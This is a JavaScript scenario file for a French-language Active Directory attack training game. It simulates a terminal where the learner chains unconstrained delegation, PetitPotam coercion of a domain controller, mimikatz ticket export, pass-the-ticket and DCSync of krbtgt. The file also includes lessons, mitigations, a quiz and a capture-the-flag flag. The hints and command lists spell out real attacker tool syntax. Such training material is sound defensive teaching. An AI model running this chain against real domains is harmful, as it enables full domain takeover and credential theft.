
// ---------------------------------------------------------
// SCÉNARIO 08 — DÉLÉGATION SANS CONTRAINTE + COERCITION (PETITPOTAM)
// ---------------------------------------------------------
SCENARIOS.unconstrained = {
  id:'unconstrained',
  tag:'🪤 SCÉNARIO 08 · DÉLÉGATION SANS CONTRAINTE',
  lessonTag:'📘 LEÇON · SCÉNARIO 08',
  opsecEnabled:true,
  noiseRules:[NOISE.netUserAll, NOISE.domainComputerUnconstrained, NOISE.petitpotam, NOISE.sekurlsaTickets, NOISE.kerberosPtt, NOISE.dcsyncAny],
  startUser:'svc_web',

  identities:{
    'svc_web':  { label:'CORP\\svc_web', priv:'Administrateur local sur WEB01', groups:['Domain Users'], desc:"Compte de service applicatif — administrateur local de WEB01 uniquement, aucun droit sur le domaine" },
    'DC01$':    { label:'CORP\\DC01$', priv:'Compte machine — contrôleur de domaine', groups:['Domain Users','Domain Controllers'], desc:'Compte machine du contrôleur de domaine DC01' },
    'a.rousseau': { label:'CORP\\a.rousseau', priv:'Administrateur du domaine', groups:['Domain Users','Domain Admins'], desc:'Administrateur — équipe infrastructure' }
  },

  computers:{
    'WEB01': { desc:'Serveur applicatif — hébergement intranet', unconstrained:true,
      note:"Déployé rapidement pour une intégration SSO, jamais revu depuis : coché « Approuver cet ordinateur pour la délégation à n'importe quel service » (délégation sans contrainte)." },
    'DC01':  { desc:'Contrôleur de domaine', unconstrained:true,
      note:'Un contrôleur de domaine a toujours la délégation sans contrainte activée par défaut — normal pour un DC, pas pour un serveur applicatif.' },
    'SQL01': { desc:'Serveur de base de données', unconstrained:false, note:'Délégation contrainte uniquement — rien d\'anormal ici.' }
  },

  hashes:{ 'krbtgt': 'e19ccf75ee54e06b06a5907af13cef42' },

  ticketName:'[0;3e7]-2-0-60a10000-DC01$@krbtgt-CORP.LOCAL.kirbi',

  objectives:[
    { id:'enum',    text:'Repérer les ordinateurs trustés pour la délégation sans contrainte' },
    { id:'coerce',  text:"Forcer le contrôleur de domaine à s'authentifier sur WEB01 (coercition)" },
    { id:'capture', text:'Extraire le ticket du contrôleur de domaine capturé en mémoire' },
    { id:'ptt',     text:"Rejouer ce ticket pour devenir DC01$ (Pass-the-Ticket)" },
    { id:'dcsync',  text:"Répliquer le hash de krbtgt en te faisant passer pour un contrôleur de domaine" },
  ],

  hints:[
    ["Tu es administrateur local d'un serveur, mais lequel a une configuration de délégation dangereuse ? Il faut chercher du côté des comptes machine.",
     "Il existe une commande qui liste les ordinateurs du domaine trustés pour la délégation sans contrainte.",
     "Liste les ordinateurs à délégation sans contrainte : `get-domaincomputer -unconstrained`"],
    ["WEB01 accepte n'importe quelle authentification entrante et la met en cache, y compris celle d'un contrôleur de domaine. Encore faut-il le faire venir à toi.",
     "Il existe un outil qui force une machine distante à s'authentifier sur un serveur de ton choix, en abusant d'un protocole Windows légitime (MS-EFSRPC) — sans connaître le moindre mot de passe.",
     "Force DC01 à s'authentifier sur WEB01 : `petitpotam /listener:WEB01 /target:DC01`"],
    ["Quand DC01 s'est authentifié sur WEB01, son ticket a été mis en cache en mémoire — parce que WEB01 est en délégation sans contrainte.",
     "Utilise mimikatz pour exporter les tickets Kerberos présents en mémoire sur WEB01.",
     "Exporte les tickets en cache : `mimikatz sekurlsa::tickets /export`"],
    ["Le ticket exporté est un vrai TGT du compte machine DC01$. Un TGT se rejoue directement, comme un hash.",
     "Utilise mimikatz pour injecter ce ticket dans ta session actuelle.",
     "Injecte le ticket capturé : `mimikatz kerberos::ptt <nom_du_ticket>`"],
    ["Tu es maintenant DC01$ — littéralement un contrôleur de domaine aux yeux de l'annuaire. Un DC a toujours le droit de répliquer n'importe quel secret.",
     "Réplique le hash du compte krbtgt, la clé qui signe tous les tickets du domaine.",
     "Réplique krbtgt en te faisant passer pour DC01 : `mimikatz lsadump::dcsync /user:krbtgt`"]
  ],

  manPages:{
    'get-domaincomputer': { name:'get-domaincomputer -unconstrained', role:"Liste les comptes machine trustés pour la délégation sans contrainte",
      explain:"Un ordinateur en délégation sans contrainte met en cache, en mémoire, le TGT complet de tout compte qui s'y authentifie — y compris un contrôleur de domaine. C'est censé ne concerner que les DC ; un serveur applicatif qui l'a aussi est une faille de configuration classique.",
      usage:'get-domaincomputer -unconstrained' },
    'petitpotam': { name:'petitpotam', role:"Force une machine distante à s'authentifier sur un serveur choisi (coercition)",
      explain:"Abuse du protocole MS-EFSRPC (chiffrement de fichiers à distance) pour convaincre une machine — même un contrôleur de domaine — d'ouvrir une connexion d'authentification vers un serveur que tu contrôles. Aucun mot de passe n'est nécessaire : c'est le protocole lui-même qui est détourné.",
      usage:'petitpotam /listener:<serveur_piège> /target:<machine_a_coercer>' },
    'mimikatz': { name:'mimikatz', role:'Boîte à outils post-exploitation AD',
      explain:"<code>sekurlsa::tickets /export</code> exporte tous les tickets Kerberos actuellement en mémoire sur la machine — y compris ceux capturés grâce à la délégation sans contrainte. <code>kerberos::ptt &lt;ticket&gt;</code> injecte un ticket exporté dans ta session (Pass-the-Ticket). <code>lsadump::dcsync /user:&lt;nom&gt;</code> réplique le hash d'un compte en se faisant passer pour un contrôleur de domaine — ce qui fonctionne dès lors que ton identité actuelle EST un compte machine de contrôleur de domaine.",
      usage:'mimikatz sekurlsa::tickets /export | mimikatz kerberos::ptt <ticket> | mimikatz lsadump::dcsync /user:<nom>' }
  },

  knownCommands:[
    'help','clear','man ','whoami /priv',
    'net user /domain','get-domaincomputer -unconstrained',
    'petitpotam /listener:WEB01 /target:DC01',
    'mimikatz sekurlsa::tickets /export',
    'mimikatz kerberos::ptt ',
    'mimikatz lsadump::dcsync /user:'
  ],

  helpLine:'whoami /priv, net user /domain, get-domaincomputer -unconstrained, petitpotam /listener:&lt;serveur&gt; /target:&lt;machine&gt;, mimikatz sekurlsa::tickets /export, mimikatz kerberos::ptt &lt;ticket&gt;, mimikatz lsadump::dcsync /user:&lt;nom&gt;, clear',

  cmdRefHtml:`whoami /priv<br>net user /domain<br>get-domaincomputer -unconstrained<br>petitpotam /listener:&lt;serveur&gt; /target:&lt;machine&gt;<br>mimikatz sekurlsa::tickets /export<br>mimikatz kerberos::ptt &lt;ticket&gt;<br>mimikatz lsadump::dcsync /user:&lt;nom&gt;<br>help`,

  introLines:[
    `<span class="out-dim">Microsoft Windows [Simulation AD Lab]</span>`,
    `<span class="out-dim">Session ouverte en tant que CORP\\svc_web sur WEB01 (administrateur local)</span>`,
    `<span class="out-info">Tape <b>help</b> pour voir les commandes disponibles.</span>`
  ],

  lessonSlides:[
    { icon:'🪤', title:'La délégation sans contrainte', html:
      `<p>Un ordinateur du domaine peut être configuré pour la <b>délégation sans contrainte</b> : quand un utilisateur s'y authentifie, la machine reçoit une <b>copie complète et réutilisable de son TGT</b> (son ticket d'accès complet), mise en cache en mémoire.</p>
       <p>C'est prévu pour certains cas légitimes (un DC en a toujours besoin). Le problème : ça se retrouve parfois aussi sur un simple serveur applicatif, activé par erreur ou par facilité lors d'un déploiement.</p>` },
    { icon:'📨', title:'La coercition : forcer la venue', html:
      `<p>Avoir un serveur piégé ne sert à rien si personne d'intéressant ne s'y connecte. Des outils comme <b>PetitPotam</b> abusent de protocoles Windows légitimes (MS-EFSRPC) pour <b>forcer une machine distante</b> — même un contrôleur de domaine — à initier une authentification vers un serveur choisi par l'attaquant.</p>
       <p>Aucun mot de passe, aucun clic utilisateur nécessaire : la machine cible obéit au protocole.</p>` },
    { icon:'👑', title:"Capturer un contrôleur de domaine", html:
      `<p>Si le serveur piégé est en délégation sans contrainte, le TGT du contrôleur de domaine coercé (son <b>compte machine</b>, ex. <code>DC01$</code>) est capturé en mémoire. Ce compte machine a, de fait, <b>tous les droits d'un contrôleur de domaine</b> — y compris répliquer n'importe quel secret (DCSync).</p>
       <p>Résultat : un simple accès admin local sur un serveur mal configuré mène directement au hash de <b>krbtgt</b>, la clé de voûte du domaine.</p>` },
    { icon:'📋', title:'Ta mission', html:
      `<p>Tu es administrateur local de <b>WEB01</b>, un serveur applicatif — rien de plus, aucun droit sur le domaine. Découvre pourquoi sa configuration de délégation est dangereuse, force le contrôleur de domaine à s'y authentifier, et capture de quoi devenir lui.</p>
       <p class="lesson-tip">💡 Tape <b>help</b> une fois dans le terminal, ou <b>man &lt;commande&gt;</b> pour comprendre une commande précise.</p>` }
  ],

  completeTitle:'Contrôleur de domaine impersonné',
  completeSub:"Un admin local sur un serveur oublié, et voilà le domaine entier répliqué.",
  chainSteps:[
    {icon:'🪤', label:'Délégation repérée'}, {icon:'📨', label:'DC coercé'},
    {icon:'🎟️', label:'TGT capturé'}, {icon:'🧬', label:'DCSync krbtgt'}
  ],
  flag:'FLAG{unconstrained_delegation_petitpotam_dcsync_krbtgt}',

  graph:{
    nodes:[
      { id:'svc_web', label:'svc_web', type:'user' },
      { id:'web01', label:'WEB01 (délégation ⚠)', type:'group' },
      { id:'dc01', label:'DC01', type:'group' },
      { id:'dc01_machine', label:'DC01$', type:'admin' },
      { id:'krbtgt', label:'krbtgt', type:'admin' }
    ],
    edges:[
      { id:'e_local', from:'svc_web', to:'web01', type:'memberof', label:'Admin local' },
      { id:'e_coerce', from:'web01', to:'dc01', type:'auth', label:'Coercition PetitPotam' },
      { id:'e_capture', from:'dc01', to:'dc01_machine', type:'abuse', label:'TGT capturé (délégation sans contrainte)' },
      { id:'e_owned', from:'svc_web', to:'dc01_machine', type:'owned', label:'Pass-the-Ticket' },
      { id:'e_dcsync', from:'dc01_machine', to:'krbtgt', type:'auth', label:'DCSync' }
    ]
  },

  deepDive:{
    mitre:[{id:'T1187', name:"Forced Authentication"}, {id:'T1550.003', name:"Use Alternate Authentication Material: Pass the Ticket"}],
    why:"La délégation sans contrainte est un réglage légitime pour les contrôleurs de domaine, mais dangereux dès qu'il se retrouve sur un serveur applicatif ordinaire : n'importe quel compte qui s'y authentifie y laisse une copie complète et réutilisable de son ticket. Combinée à la coercition (forcer une authentification, par exemple via PetitPotam et le protocole MS-EFSRPC), cette configuration permet de capturer le ticket d'un contrôleur de domaine sans jamais avoir de droit sur le domaine au départ — un simple accès administrateur local sur le mauvais serveur suffit. Une fois ce ticket rejoué, l'attaquant EST littéralement un contrôleur de domaine aux yeux de l'annuaire, avec tous les droits de réplication qui vont avec.",
    defenses:[
      "Ne jamais activer la délégation sans contrainte sur autre chose qu'un contrôleur de domaine — utiliser la délégation contrainte (ou contrainte avec authentification protégée par ressource) partout ailleurs",
      "Ajouter les comptes à privilèges (et si possible les comptes machine sensibles) au groupe « Protected Users » ou cocher « Ce compte est sensible et ne peut pas être délégué »",
      "Corriger MS-EFSRPC et les protocoles de coercition similaires (mises à jour de sécurité), et restreindre RPC/SMB entrant vers les contrôleurs de domaine depuis les serveurs applicatifs",
      "Auditer régulièrement les objets ordinateur avec l'attribut TRUSTED_FOR_DELEGATION activé — la liste doit être connue et minimale"
    ],
    quiz:[
      { q:"Que capture-t-on précisément grâce à la délégation sans contrainte ?",
        options:["Le mot de passe en clair de la machine qui s'authentifie","Une copie complète et réutilisable du TGT (ticket Kerberos) de la machine qui s'authentifie","Un hash NTLM aléatoire","Rien, la délégation sans contrainte est un mécanisme purement défensif"],
        correct:1,
        explain:"La machine en délégation sans contrainte reçoit et met en cache une copie complète du TGT de tout compte qui s'y authentifie — c'est ce ticket qui devient réutilisable par l'attaquant." },
      { q:"À quoi sert un outil de coercition comme PetitPotam dans cette chaîne d'attaque ?",
        options:["À casser un mot de passe hors-ligne","À forcer une machine distante (ex. un contrôleur de domaine) à initier une authentification vers un serveur choisi par l'attaquant","À chiffrer les fichiers de la victime","À élever discrètement ses propres droits locaux"],
        correct:1,
        explain:"Sans coercition, un serveur en délégation sans contrainte ne capture que les comptes qui s'y connectent naturellement. PetitPotam force artificiellement la venue d'une cible choisie, comme un contrôleur de domaine." },
      { q:"Pourquoi capturer le TGT du compte machine d'un contrôleur de domaine (DC01$) est-il si grave ?",
        options:["Ça ne l'est pas, un compte machine n'a aucun droit particulier","Un compte machine de contrôleur de domaine a, de fait, les droits de réplication complets sur le domaine (DCSync)","Ça permet uniquement de redémarrer le serveur","Ça ne fonctionne que si l'attaquant est déjà Domain Admin"],
        correct:1,
        explain:"Un contrôleur de domaine réplique en permanence l'annuaire avec les autres DC : son compte machine possède donc nativement les droits de réplication complets, exploitables via DCSync une fois son ticket rejoué." }
    ]
  },

  initState(){ return { ticketExported:false, ptt:false }; },

  handle(lower, cmd, m){
    const sc = SCENARIOS.unconstrained;

    if(lower === 'whoami /priv' || lower === 'whoami'){
      const u = sc.identities[state.user];
      print(`<span class="out-info">Utilisateur : ${u.label}</span>`);
      print(`<span class="out-info">Rôle : ${u.priv}</span>`);
      print(`<span class="out-info">Groupes : ${u.groups.join(', ')}</span>`);
      return true;
    }

    if(lower === 'net user /domain'){
      print(`<span class="out-info">Comptes du domaine CORP.LOCAL :</span>`);
      Object.keys(sc.identities).forEach(name => { if(!name.endsWith('$')) print(`<span class="out-dim">  ${name}</span>`); });
      print(`<span class="out-dim">💡 Les comptes machine (ex: DC01$) n'apparaissent pas ici — cherche du côté de get-domaincomputer.</span>`);
      complete('enum');
      return true;
    }

    if(lower === 'get-domaincomputer -unconstrained'){
      print(`<span class="out-info">Ordinateurs trustés pour la délégation sans contrainte :</span>`);
      Object.entries(sc.computers).forEach(([name, c]) => {
        if(c.unconstrained){
          const warn = name === 'WEB01' ? ' ⚠ serveur applicatif — anormal' : ' (normal pour un contrôleur de domaine)';
          print(`<span class="out-warn">  ${name} — ${c.desc}${warn}</span>`);
        }
      });
      print(`<span class="out-dim">💡 Tu es administrateur local de WEB01 : n'importe quelle machine qui s'y authentifie y laisse son TGT en mémoire.</span>`);
      AttackGraph.reveal({ nodes:['svc_web','web01','dc01'], edges:['e_local'] });
      complete('enum');
      return true;
    }

    m = lower.match(/^petitpotam \/listener:(\S+) \/target:(\S+)$/);
    if(m){
      const listener = m[1].toUpperCase(), target = m[2].toUpperCase();
      if(listener !== 'WEB01' || !sc.computers[target]){
        print(`<span class="out-bad">Coercition échouée : vérifie le nom du serveur piège et de la cible (ex: WEB01 et DC01).</span>`);
        return true;
      }
      if(target !== 'DC01'){
        print(`<span class="out-warn">${target} s'authentifie bien sur WEB01, mais ce n'est pas un contrôleur de domaine — son TGT n'a pas grand intérêt. Cible plutôt DC01.</span>`);
        return true;
      }
      print(`<span class="out-info">Requête MS-EFSRPC envoyée à DC01 (prétexte : accès à un fichier chiffré sur WEB01)...</span>`);
      print(`<span class="out-good">DC01 s'authentifie sur WEB01 — son TGT (compte machine DC01$) vient d'être mis en cache en mémoire sur WEB01, où tu es administrateur local.</span>`);
      state.extra.coerced = true;
      AttackGraph.reveal({ nodes:['dc01_machine'], edges:['e_coerce','e_capture'] });
      complete('coerce');
      return true;
    }

    if(lower === 'mimikatz sekurlsa::tickets /export'){
      if(!state.extra.coerced){
        print(`<span class="out-bad">Aucun ticket intéressant en mémoire pour l'instant — force d'abord une authentification vers WEB01 avec petitpotam.</span>`);
        return true;
      }
      print(`<span class="out-info">Export des tickets Kerberos en mémoire sur WEB01...</span>`);
      print(`<span class="out-good">Ticket exporté :</span>`);
      print(`<span class="out-dim">  ${sc.ticketName}</span>`);
      state.extra.ticketExported = true;
      complete('capture');
      return true;
    }

    m = lower.match(/^mimikatz kerberos::ptt (\S+)$/);
    if(m){
      if(!state.extra.ticketExported){
        print(`<span class="out-bad">Aucun ticket exporté à injecter — exporte d'abord les tickets en mémoire avec sekurlsa::tickets /export.</span>`);
        return true;
      }
      if(m[1] !== sc.ticketName.toLowerCase()){
        print(`<span class="out-bad">Ticket introuvable ou nom incorrect. Réutilise exactement le nom de fichier renvoyé par l'export.</span>`);
        return true;
      }
      state.user = 'DC01$';
      state.extra.ptt = true;
      updatePrompt();
      print(`<span class="out-good">Ticket injecté avec succès — tu es désormais CORP\\DC01$ aux yeux de l'annuaire (Pass-the-Ticket).</span>`);
      AttackGraph.reveal({ edges:['e_owned'] });
      AttackGraph.markOwned('dc01_machine');
      complete('ptt');
      return true;
    }

    m = lower.match(/^mimikatz lsadump::dcsync \/user:(\S+)$/);
    if(m){
      const target = m[1];
      if(!state.extra.ptt){
        print(`<span class="out-bad">Accès refusé : la réplication (DCSync) nécessite d'être authentifié comme un contrôleur de domaine. Injecte d'abord le ticket capturé.</span>`);
        return true;
      }
      if(target !== 'krbtgt'){
        print(`<span class="out-warn">Réplication possible, mais c'est le hash de krbtgt qui referme cette chaîne d'attaque (clé de tous les tickets du domaine).</span>`);
        return true;
      }
      const h = sc.hashes['krbtgt'];
      print(`<span class="out-info">Réplication d'annuaire demandée au contrôleur pour krbtgt, en tant que CORP\\DC01$...</span>`);
      print(`<span class="out-good">Hash NTLM de krbtgt répliqué :</span>`);
      print(`<span class="out-dim">  krbtgt:${h}</span>`);
      AttackGraph.reveal({ edges:['e_dcsync'] });
      print(`<span class="flag-tag">${sc.flag}</span> <button class="copy-btn" onclick="copyFlag(this)">📋 Copier</button>`);
      print(`<span class="out-good">🎉 Bravo — chaîne complète : admin local sur un serveur en délégation sans contrainte → coercition du DC (PetitPotam) → capture du TGT DC01$ → Pass-the-Ticket → DCSync de krbtgt. Aucun mot de passe touché, aucun droit de domaine possédé au départ.</span>`);
      print(`<span class="out-dim">🛡️ Pour se défendre : bannir la délégation sans contrainte hors des contrôleurs de domaine, corriger les vecteurs de coercition (MS-EFSRPC), et protéger les comptes sensibles contre la délégation.</span>`);
      complete('dcsync');
      finishMission();
      return true;
    }

    return false;
  }
};
